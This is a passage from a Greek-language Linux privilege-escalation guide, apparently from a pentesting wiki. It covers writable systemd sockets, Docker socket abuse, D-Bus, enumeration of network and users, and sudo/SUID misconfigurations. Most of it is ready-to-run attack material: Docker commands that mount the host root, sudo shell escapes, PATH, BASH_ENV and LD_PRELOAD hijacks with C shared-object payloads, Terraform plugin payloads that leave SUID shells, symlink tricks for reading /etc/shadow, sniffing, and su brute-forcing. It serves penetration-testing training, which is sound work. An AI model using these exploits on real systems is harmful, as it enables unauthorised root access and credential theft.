- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές είναι διαφορετικές αλλά συνοπτικά χρησιμοποιούνται για **να υποδείξουν από πού θα ακούει** το socket (το μονοπάτι του AF_UNIX socket αρχείου, το IPv4/6 και/ή ο αριθμός θύρας που θα ακούει, κ.λπ.)
- `Accept`: Παίρνει μια boolean παράμετρο. Αν είναι **true**, τότε **δημιουργείται ένα service instance για κάθε εισερχόμενη σύνδεση** και μόνο το connection socket μεταβιβάζεται σε αυτό. Αν είναι **false**, όλα τα sockets ακρόασης αυτά καθαυτά **περνάνε στο ξεκινούμενο service unit**, και δημιουργείται μόνο ένα service unit για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για datagram sockets και FIFOs όπου ένα ενιαίο service unit χειρίζεται αμετάβλητα όλη την εισερχόμενη κίνηση. **Defaults to false**. Για λόγους απόδοσης, συνιστάται να γράφονται νέες daemons με τρόπο κατάλληλο για `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Παίρνουν μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** τη δημιουργία και το binding των sockets/FIFOs, αντίστοιχα. Το πρώτο token της γραμμής εντολής πρέπει να είναι ένα απόλυτο όνομα αρχείου, ακολουθούμενο από τα επιχειρήματα για τη διεργασία.
- `ExecStopPre`, `ExecStopPost`: Πρόσθετες **εντολές** που **εκτελούνται πριν** ή **μετά** το κλείσιμο και την αφαίρεση των sockets/FIFOs, αντίστοιχα.
- `Service`: Προσδιορίζει το όνομα του **service** unit που **θα ενεργοποιηθεί** σε **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Προεπιλογή είναι το service που έχει το ίδιο όνομα με το socket (με την κατάληξη αντικατεστημένη). Στις περισσότερες περιπτώσεις δεν θα είναι απαραίτητο να χρησιμοποιηθεί αυτή η επιλογή.

### Εγγράψιμα .socket αρχεία

Αν βρείτε ένα **writable** `.socket` αρχείο μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι σαν: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν δημιουργηθεί το socket. Συνεπώς, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση της μηχανής.**\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί αυτήν τη διαμόρφωση αρχείου socket αλλιώς το backdoor δεν θα εκτελεστεί_

### Εγγράψιμα sockets

Αν **εντοπίσετε κάποιο writable socket** (_τώρα μιλάμε για Unix Sockets και όχι για τα config `.socket` αρχεία_), τότε **μπορείτε να επικοινωνήσετε** με αυτό το socket και ίσως exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Παράδειγμα εκμετάλλευσης:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι μπορεί να υπάρχουν μερικά **sockets listening for HTTP** requests (_Δεν αναφέρομαι σε .socket files αλλά στα αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Αν το socket **απαντά σε αίτημα HTTP**, τότε μπορείς να **επικοινωνήσεις** με αυτό και ίσως να **εκμεταλλευτείς κάποια ευπάθεια**.

### Εγγράψιμο Docker socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να προστατευτεί. Από προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή δικαιώματος εγγραφής σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Ακολουθεί ανάλυση του πώς αυτό μπορεί να γίνει και εναλλακτικές μέθοδοι αν το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation με Docker CLI**

Αν έχεις δικαίωμα εγγραφής στο Docker socket, μπορείς να escalate privileges χρησιμοποιώντας τις παρακάτω εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Αυτές οι εντολές σας επιτρέπουν να εκτελέσετε ένα container με πρόσβαση root στο σύστημα αρχείων του host.

#### **Χρήση Docker API απευθείας**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το Docker socket μπορεί να χειριστεί ακόμα χρησιμοποιώντας το Docker API και εντολές `curl`.

1.  **List Docker Images:** Ανακτήστε τη λίστα των διαθέσιμων images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Στείλτε ένα αίτημα για να δημιουργήσετε ένα container που προσδέτει τον ριζικό κατάλογο του host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Χρησιμοποιήστε `socat` για να δημιουργήσετε μια σύνδεση με το container, επιτρέποντας την εκτέλεση εντολών μέσα σε αυτό.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Αφού ρυθμίσετε τη σύνδεση `socat`, μπορείτε να εκτελείτε εντολές απευθείας στο container με πρόσβαση root στο σύστημα αρχείων του host.

### Άλλα

Σημειώστε ότι αν έχετε δικαιώματα εγγραφής πάνω στο docker socket επειδή βρίσκεστε **μέσα στην ομάδα `docker`** έχετε [**περισσότερους τρόπους για ανύψωση προνομίων**](interesting-groups-linux-pe/index.html#docker-group). Αν το [**Docker API ακούει σε θύρα** μπορείτε επίσης να το παραβιάσετε](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Ελέγξτε **περισσότερους τρόπους διαφυγής από το docker ή κατάχρησής του για ανύψωση προνομίων** στο:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Αν βρείτε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`ctr`** διαβάστε την παρακάτω σελίδα καθώς **ενδέχεται να μπορείτε να την καταχραστείτε για ανύψωση προνομίων**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Αν βρείτε ότι μπορείτε να χρησιμοποιήσετε την εντολή **`runc`** διαβάστε την παρακάτω σελίδα καθώς **ενδέχεται να μπορείτε να την καταχραστείτε για ανύψωση προνομίων**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

Το D-Bus είναι ένα εξελιγμένο σύστημα inter-Process Communication (IPC) που επιτρέπει στις εφαρμογές να αλληλεπιδρούν και να μοιράζονται δεδομένα με αποδοτικό τρόπο. Σχεδιασμένο για το σύγχρονο σύστημα Linux, παρέχει ένα στιβαρό πλαίσιο για διάφορες μορφές επικοινωνίας μεταξύ εφαρμογών.

Το σύστημα είναι ευέλικτο, υποστηρίζοντας βασικό IPC που βελτιώνει την ανταλλαγή δεδομένων μεταξύ διεργασιών, θυμίζοντας βελτιωμένα UNIX domain sockets. Επιπλέον, βοηθά στη δημοσίευση γεγονότων ή σημάτων, διευκολύνοντας την ομαλή ενσωμάτωση μεταξύ συστατικών του συστήματος. Για παράδειγμα, ένα σήμα από έναν Bluetooth daemon για εισερχόμενη κλήση μπορεί να κάνει έναν music player να σιγήσει, βελτιώνοντας την εμπειρία χρήστη. Επιπλέον, το D-Bus υποστηρίζει ένα σύστημα απομακρυσμένων αντικειμένων, απλοποιώντας αιτήματα υπηρεσιών και κλήσεις μεθόδων μεταξύ εφαρμογών, καθιστώντας διαδικασίες που παραδοσιακά ήταν περίπλοκες πιο απλές.

Το D-Bus λειτουργεί με ένα μοντέλο allow/deny, διαχειριζόμενο τα δικαιώματα μηνυμάτων (κλήσεις μεθόδων, εκπομπές σημάτων κ.λπ.) με βάση το συνολικό αποτέλεσμα των κανόνων πολιτικής που ταιριάζουν. Αυτές οι πολιτικές καθορίζουν τις αλληλεπιδράσεις με το bus και ενδέχεται να επιτρέψουν ανύψωση προνομίων μέσω της εκμετάλλευσης αυτών των δικαιωμάτων.

Παρατίθεται ένα παράδειγμα τέτοιας πολιτικής στο `/etc/dbus-1/system.d/wpa_supplicant.conf`, το οποίο περιγράφει δικαιώματα για τον χρήστη root να γίνει owner, να στείλει και να λάβει μηνύματα από το `fi.w1.wpa_supplicant1`.

Πολιτικές χωρίς ορισμένο χρήστη ή ομάδα εφαρμόζονται καθολικά, ενώ οι πολιτικές σε context "default" εφαρμόζονται σε όλους όσους δεν καλύπτονται από άλλες συγκεκριμένες πολιτικές.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Μάθε πώς να enumerate και να exploit μια D-Bus επικοινωνία εδώ:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Δίκτυο**

Είναι πάντα ενδιαφέρον να enumerate το δίκτυο και να προσδιορίσεις τη θέση της μηχανής.

### Γενική enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ανοιχτές θύρες

Έλεγξε πάντα τις υπηρεσίες δικτύου που τρέχουν στη μηχανή και με τις οποίες δεν μπόρεσες να αλληλεπιδράσεις πριν αποκτήσεις πρόσβαση σε αυτήν:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Ελέγξτε αν μπορείτε να sniff traffic. Αν μπορείτε, μπορεί να καταφέρετε να αποκτήσετε μερικά credentials.
```
timeout 1 tcpdump
```
## Χρήστες

### Γενική Καταγραφή

Ελέγξτε **ποιος** είστε, ποια **προνόμια** έχετε, ποιοι **χρήστες** υπάρχουν στο σύστημα, ποιοι μπορούν να κάνουν **login** και ποιοι έχουν **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Ορισμένες εκδόσεις του Linux επηρεάστηκαν από ένα σφάλμα που επιτρέπει σε χρήστες με **UID > INT_MAX** να escalate privileges. Περισσότερες πληροφορίες: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Ομάδες

Έλεγξε αν είσαι **μέλος κάποιας ομάδας** που θα μπορούσε να σου παρέχει δικαιώματα root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Πρόχειρο

Έλεγξε αν υπάρχει κάτι ενδιαφέρον στο πρόχειρο (αν είναι δυνατόν)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Πολιτική Κωδικών Πρόσβασης
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Γνωστοί κωδικοί

Εάν **γνωρίζετε οποιονδήποτε κωδικό** του περιβάλλοντος, **δοκιμάστε να συνδεθείτε ως κάθε χρήστης** χρησιμοποιώντας αυτόν τον κωδικό.

### Su Brute

If don't mind about doing a lot of noise and `su` and `timeout` binaries are present on the computer, you can try to brute-force user using [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) με την παράμετρο `-a` επίσης προσπαθεί να κάνει brute-force σε χρήστες.

## Καταχρήσεις εγγράψιμου PATH

### $PATH

Εάν διαπιστώσετε ότι μπορείτε να **γράψετε μέσα σε κάποιον φάκελο του $PATH** μπορεί να καταφέρετε να αυξήσετε προνόμια με το **δημιουργώντας ένα backdoor μέσα στον εγγράψιμο φάκελο** με το όνομα κάποιας εντολής που πρόκειται να εκτελεστεί από διαφορετικό χρήστη (ιδανικά root) και που **δεν φορτώνεται από φάκελο που βρίσκεται πριν** από τον εγγράψιμο φάκελό σας στο $PATH.

### SUDO and SUID

Μπορεί να σας επιτρέπεται να εκτελέσετε κάποια εντολή χρησιμοποιώντας sudo ή κάποια δυαδικά να έχουν το suid bit. Ελέγξτε το χρησιμοποιώντας:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Μερικές **μη αναμενόμενες εντολές σας επιτρέπουν να διαβάσετε και/ή να γράψετε αρχεία ή ακόμα και να εκτελέσετε μια εντολή.** Για παράδειγμα:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Η διαμόρφωση του Sudo μπορεί να επιτρέψει σε έναν χρήστη να εκτελέσει κάποια εντολή με τα προνόμια άλλου χρήστη χωρίς να γνωρίζει τον κωδικό.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Σε αυτό το παράδειγμα ο χρήστης `demo` μπορεί να τρέξει το `vim` ως `root`. Είναι πλέον εύκολο να αποκτήσετε ένα shell προσθέτοντας ένα ssh key στον root directory ή καλώντας `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Αυτή η οδηγία επιτρέπει στον χρήστη να **set an environment variable** κατά την εκτέλεση κάποιας εντολής:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Αυτό το παράδειγμα, **based on HTB machine Admirer**, ήταν **ευάλωτο** σε **PYTHONPATH hijacking** για να φορτώσει μια αυθαίρετη python βιβλιοθήκη ενώ το script εκτελούνταν ως root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV διατηρείται μέσω sudo env_keep → root shell

Εάν το sudoers διατηρεί το `BASH_ENV` (π.χ., `Defaults env_keep+="ENV BASH_ENV"`), μπορείτε να αξιοποιήσετε τη μη-διαδραστική διαδικασία εκκίνησης του Bash για να εκτελέσετε αυθαίρετο κώδικα ως root όταν καλείτε μια επιτρεπόμενη εντολή.

- Γιατί λειτουργεί: Σε μη-διαδραστικά shells, το Bash αξιολογεί το `$BASH_ENV` και κάνει source σε αυτό το αρχείο πριν εκτελέσει το στοχευόμενο script. Πολλοί κανόνες sudo επιτρέπουν την εκτέλεση ενός script ή ενός shell wrapper. Εάν το `BASH_ENV` διατηρείται από το sudo, το αρχείο σας φορτώνεται με προνόμια root.

- Απαιτήσεις:
- Ένας κανόνας sudo που μπορείτε να εκτελέσετε (οποιοσδήποτε στόχος που καλεί `/bin/bash` μη-διαδραστικά, ή οποιοδήποτε bash script).
- `BASH_ENV` παρόν σε `env_keep` (ελέγξτε με `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Σκληροποίηση:
- Αφαίρεσε `BASH_ENV` (και `ENV`) από το `env_keep`, προτίμησε `env_reset`.
- Απόφυγε shell wrappers για εντολές που επιτρέπονται με sudo; χρησιμοποίησε minimal binaries.
- Σκέψου sudo I/O logging και alerting όταν χρησιμοποιούνται preserved env vars.

### Terraform μέσω sudo με διατηρημένο HOME (!env_reset)

Εάν το sudo αφήνει το περιβάλλον ανέπαφο (`!env_reset`) ενώ επιτρέπει το `terraform apply`, το `$HOME` παραμένει του χρήστη που κάλεσε. Συνεπώς το Terraform φορτώνει **$HOME/.terraformrc** ως root και εφαρμόζει το `provider_installation.dev_overrides`.

- Κατεύθυνε τον απαιτούμενο provider σε έναν κατάλογο με δικαίωμα εγγραφής και τοποθέτησε ένα κακόβουλο plugin με όνομα ίσο με τον provider (π.χ. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform will fail the Go plugin handshake but executes the payload as root before dying, leaving a SUID shell behind.

### TF_VAR overrides + symlink validation bypass

Οι μεταβλητές του Terraform μπορούν να παρέχονται μέσω των περιβαλλοντικών μεταβλητών `TF_VAR_<name>`, οι οποίες διατηρούνται όταν το sudo διατηρεί το περιβάλλον. Αδύναμοι έλεγχοι όπως `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` μπορούν να παρακαμφθούν με symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Το Terraform επιλύει το symlink και αντιγράφει το πραγματικό `/root/root.txt` σε έναν προορισμό αναγνώσιμο από τον επιτιθέμενο. Η ίδια προσέγγιση μπορεί να χρησιμοποιηθεί για να **γράψει** σε προνομιούχες διαδρομές δημιουργώντας εκ των προτέρων προοριστικά symlinks (π.χ., δείχνοντας το destination path του provider μέσα σε `/etc/cron.d/`).

### requiretty / !requiretty

Σε κάποιες παλαιότερες διανομές, το sudo μπορεί να ρυθμιστεί με `requiretty`, το οποίο αναγκάζει το sudo να τρέχει μόνο από ένα διαδραστικό TTY. Αν το `!requiretty` είναι ενεργοποιημένο (ή η επιλογή απουσιάζει), το sudo μπορεί να εκτελεστεί από μη διαδραστικά περιβάλλοντα όπως reverse shells, cron jobs ή scripts.
```bash
Defaults !requiretty
```
Αυτό δεν αποτελεί άμεση ευπάθεια από μόνο του, αλλά διευρύνει τις καταστάσεις όπου οι κανόνες sudo μπορούν να καταχραστούν χωρίς να απαιτείται πλήρες PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Αν το `sudo -l` δείχνει `env_keep+=PATH` ή ένα `secure_path` που περιέχει attacker-writable entries (π.χ., `/home/<user>/bin`), οποιαδήποτε εντολή με σχετική διαδρομή μέσα στον στόχο που επιτρέπεται από sudo μπορεί να επισκιαστεί.

- Απαιτήσεις: ένας κανόνας sudo (συχνά `NOPASSWD`) που εκτελεί ένα script/binary που καλεί εντολές χωρίς απόλυτες διαδρομές (`free`, `df`, `ps`, κ.λπ.) και μια εγγράψιμη PATH εγγραφή που αναζητείται πρώτη.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Παράκαμψη διαδρομών εκτέλεσης με Sudo
**Πηδήξτε** για να διαβάσετε άλλα αρχεία ή να χρησιμοποιήσετε **symlinks**. Για παράδειγμα στο αρχείο sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Αν χρησιμοποιηθεί **wildcard** (\*), είναι ακόμα πιο εύκολο:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Μέτρα αντιμετώπισης**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary χωρίς καθορισμένο path εντολής

Αν η **άδεια sudo** δίνεται για μια μόνο εντολή **χωρίς να καθορίζεται το path**: _hacker10 ALL= (root) less_ μπορείτε να το εκμεταλλευτείτε αλλάζοντας τη μεταβλητή PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Αυτή η τεχνική μπορεί επίσης να χρησιμοποιηθεί αν ένα **suid** binary **εκτελεί άλλη εντολή χωρίς να καθορίζει το μονοπάτι προς αυτή (ελέγξτε πάντα με** _**strings**_ **το περιεχόμενο ενός παράξενου SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary με καθορισμένο μονοπάτι εντολής

Αν το **suid** binary **εκτελεί άλλη εντολή καθορίζοντας το μονοπάτι**, τότε μπορείτε να δοκιμάσετε να **export a function** με το όνομα της εντολής που καλεί το suid αρχείο.

Για παράδειγμα, αν ένα suid binary καλεί _**/usr/sbin/service apache2 start**_ πρέπει να προσπαθήσετε να δημιουργήσετε τη function και να την export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Τότε, όταν καλέσετε το suid binary, αυτή η συνάρτηση θα εκτελεστεί

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες shared libraries (.so αρχεία) που θα φορτωθούν από τον loader πριν από όλες τις άλλες, συμπεριλαμβανομένης της standard C library (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως preloading μιας βιβλιοθήκης.

Ωστόσο, για να διατηρηθεί η ασφάλεια του συστήματος και να αποτραπεί η εκμετάλλευση αυτής της δυνατότητας, ειδικά με **suid/sgid** executables, το σύστημα επιβάλλει ορισμένους όρους:

- Ο loader αγνοεί **LD_PRELOAD** για executables όπου το real user ID (_ruid_) δεν ταιριάζει με το effective user ID (_euid_).
- Για executables με suid/sgid, προφορτώνονται μόνο βιβλιοθήκες σε standard paths που είναι επίσης suid/sgid.

Privilege escalation μπορεί να συμβεί εάν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος του `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να παραμένει και να αναγνωρίζεται ακόμη και όταν οι εντολές τρέχουν με `sudo`, ενδεχομένως οδηγώντας στην εκτέλεση αυθαίρετου κώδικα με αυξημένα προνόμια.
```
Defaults        env_keep += LD_PRELOAD
```
Αποθηκεύστε ως **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Στη συνέχεια **μεταγλωττίστε το** χρησιμοποιώντας:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Τέλος, **escalate privileges** κατά την εκτέλεση
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ένας παρόμοιος privesc μπορεί να εκμεταλλευτεί αν ο επιτιθέμενος ελέγχει τη μεταβλητή περιβάλλοντος **LD_LIBRARY_PATH**, επειδή ελέγχει τη διαδρομή όπου πρόκειται να αναζητηθούν οι βιβλιοθήκες.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Όταν συναντάτε ένα binary με **SUID** δικαιώματα που φαίνεται ασυνήθιστο, είναι καλή πρακτική να επαληθεύσετε αν φορτώνει σωστά **.so** αρχεία. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει πιθανότητα εκμετάλλευσης.

Για να το εκμεταλλευτείτε, θα προχωρούσατε δημιουργώντας ένα αρχείο C, π.χ. _"/path/to/.config/libcalc.c"_, που περιέχει τον ακόλουθο κώδικα:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, στοχεύει στην κλιμάκωση προνομίων με τη μεταβολή των δικαιωμάτων αρχείων και την εκτέλεση ενός shell με αυξημένα προνόμια.

Μεταγλωττίστε το παραπάνω αρχείο C σε ένα shared object (.so) με:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Τέλος, η εκτέλεση του επηρεασμένου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας πιθανή παραβίαση του συστήματος.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Τώρα που βρήκαμε ένα SUID binary που φορτώνει μια βιβλιοθήκη από έναν φάκελο όπου μπορούμε να γράψουμε, ας δημιουργήσουμε τη βιβλιοθήκη σε αυτόν τον φάκελο με το απαραίτητο όνομα:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Εάν λάβετε ένα σφάλμα όπως
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
αυτό σημαίνει ότι η βιβλιοθήκη που έχεις δημιουργήσει πρέπει να έχει μια συνάρτηση με το όνομα `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα Unix binaries που μπορούν να εκμεταλλευτούν οι επιτιθέμενοι για να παρακάμψουν τοπικούς περιορισμούς ασφαλείας. [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο αλλά για περιπτώσεις όπου μπορείς **only inject arguments** σε μια εντολή.

Το project συγκεντρώνει νόμιμες λειτουργίες των Unix binaries που μπορούν να καταχρηστούν για να ξεφύγουν από restricted shells, να αυξήσουν ή να διατηρήσουν elevated privileges, να μεταφέρουν αρχεία, να spawn bind and reverse shells, και να διευκολύνουν άλλες post-exploitation εργασίες.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- Έχεις ήδη ένα shell ως χρήστης "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

